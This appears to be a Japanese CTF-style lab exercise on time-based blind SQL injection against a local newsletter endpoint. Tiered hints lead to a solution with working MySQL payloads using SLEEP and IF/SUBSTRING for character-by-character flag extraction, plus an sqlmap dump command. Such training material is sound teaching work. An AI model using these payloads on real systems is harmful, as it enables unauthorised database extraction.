# 05 - Time-based Blind Injection

`http://localhost:3005` のメルマガ登録(`POST /api/subscribe`, body: `email`)は、
成功しても失敗しても常に同じ`{"status":"ok"}`しか返さない。真偽の手がかりが一切ない状態で
DB内のflagを抜き出せ。

## ヒント

<details><summary>ヒント1</summary>

`server.py`を見ろ。`email`は文字列としてクォート内にそのまま連結されている。
レスポンスは常に同じなので、真偽判定はレスポンス本体からは得られない。

</details>

<details><summary>ヒント2</summary>

`SLEEP(秒数)`はMySQLがその秒数だけ処理を止める関数。injectionが刺さっているなら、
`SLEEP`を含むpayloadを送ると応答が意図的に遅くなるはずだ。まずはこれで注入が効いているか
確認しろ。

</details>

<details><summary>ヒント3</summary>

`SLEEP`を`IF(条件, SLEEP(秒), 0)`で包めば、条件が真の時だけ遅延させられる。
これを1文字ずつの比較条件にして、応答時間の有無でtrue/falseを判定すれば
boolean-blindと同じ要領でflagを1文字ずつ復元できる。文字を総当たりする前に、まず
`LENGTH((SELECT flag FROM flags))=N`で長さを特定しておくと見通しが立てやすい。

</details>

<details><summary>解答</summary>

まずinjection成立を確認するpayload(`email`パラメータ):
```
x' OR SLEEP(3)-- 
```

サーバー側で組み立てられる実際のSQLはこうなる:
```sql
SELECT id FROM subscribers WHERE email = 'x' OR SLEEP(3)-- '
```

分解すると:
- `x'` — emailのクォートを閉じる
- `OR SLEEP(3)` — 元の条件が偽でも、ORでつないだ`SLEEP(3)`が実行されるため必ず3秒待たされる
- `-- ` — `--`はMySQLのコメント開始(**直後に半角スペース必須**、詰めて打つと構文エラーになる)。
  これで末尾の`'`を無効化している

約3秒応答が遅れれば注入成立の確認完了。

1文字ずつの抽出は`IF`で条件分岐させる:
```
x' OR IF((SELECT SUBSTRING(flag,1,1) FROM flags)='F', SLEEP(3), 0)-- 
```
条件(flagの1文字目が`'F'`か)が真ならSLEEP(3)が走って応答が遅れ、偽なら即座に返る。
`SUBSTRING(flag, N, 1)`のNを増やしながら全文字について繰り返せばflag全体を復元できる。
(flagの実際の長さは`FLAG{...}`部分含め見た目より長いことがあるので、`LENGTH()`で先に
確認しておくと文字探索の終端を見誤らない。)

sqlmapを使う場合:
```
sqlmap -u "http://localhost:3005/api/subscribe" --data="email=x" \
  -p email --technique=T --dump
```

</details>
